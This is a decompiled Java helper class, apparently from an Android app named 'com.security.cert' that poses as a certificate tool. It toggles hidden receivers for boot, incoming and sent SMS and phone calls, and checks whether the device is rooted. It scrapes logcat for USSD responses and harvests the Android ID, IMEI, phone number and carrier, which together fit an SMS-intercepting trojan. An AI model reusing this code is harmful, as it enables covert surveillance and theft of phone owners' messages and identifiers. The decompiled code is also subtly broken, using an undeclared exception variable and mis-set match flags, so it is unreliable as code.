package com.security.cert.b;

import android.content.ComponentName;
import android.content.Context;
import android.os.Build;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.security.cert.services.OnBootReceiver;
import com.security.cert.services.PhoneCallReceiver;
import com.security.cert.services.SmsReceiver;
import com.security.cert.services.SmsSentReceiver;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

public class b {
    public static String a(Context context) {
        return Secure.getString(context.getContentResolver(), "android_id");
    }

    public static void a(Context context, Class cls, boolean z) {
        context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, cls), z ? 1 : 2, 1);
    }

    public static void a(Context context, boolean z) {
        a(context, OnBootReceiver.class, z);
        a(context, SmsReceiver.class, z);
        a(context, PhoneCallReceiver.class, z);
        a(context, SmsSentReceiver.class, z);
    }

    public static boolean a() {
        String str = Build.TAGS;
        if (str != null && str.contains("test-keys")) {
            return true;
        }
        try {
            if (new File("/system/app/Superuser.apk").exists()) {
                return true;
            }
        } catch (Throwable th) {
        }
        return false;
    }

    public static boolean a(String str, String str2, String str3, boolean z) {
        IOException e;
        Throwable th;
        boolean z2 = false;
        BufferedReader bufferedReader = null;
        String str4 = str + ":" + str2;
        String str5 = "*:S";
        BufferedReader bufferedReader2;
        try {
            bufferedReader2 = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(new String[]{"logcat", "-d", str4, str5}).getInputStream()));
            String readLine;
            if (z) {
                do {
                    try {
                        readLine = bufferedReader2.readLine();
                        if (readLine == null) {
                            break;
                        }
                    } catch (IOException e2) {
                        e = e2;
                    }
                } while (!readLine.matches(str3));
                z2 = true;
            } else {
                do {
                    readLine = bufferedReader2.readLine();
                    if (readLine == null) {
                        break;
                    }
                } while (!readLine.contains(str3));
                z2 = true;
            }
            if (bufferedReader2 != null) {
                try {
                    bufferedReader2.close();
                } catch (IOException e3) {
                    Log.e("ussdtestlog", e3.getMessage());
                }
            }
        } catch (IOException e4) {
            e3 = e4;
            bufferedReader2 = null;
            try {
                Log.e("ussdtestlog", e3.getMessage());
                if (bufferedReader2 != null) {
                    try {
                        bufferedReader2.close();
                    } catch (IOException e32) {
                        Log.e("ussdtestlog", e32.getMessage());
                    }
                }
                return z2;
            } catch (Throwable th2) {
                th = th2;
                bufferedReader = bufferedReader2;
                if (bufferedReader != null) {
                    try {
                        bufferedReader.close();
                    } catch (IOException e322) {
                        Log.e("ussdtestlog", e322.getMessage());
                    }
                }
                throw th;
            }
        } catch (Throwable th3) {
            th = th3;
            if (bufferedReader != null) {
                bufferedReader.close();
            }
            throw th;
        }
        return z2;
    }

    public static String b(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
    }

    public static String c(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
    }

    public static String d(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getNetworkOperatorName();
    }
}
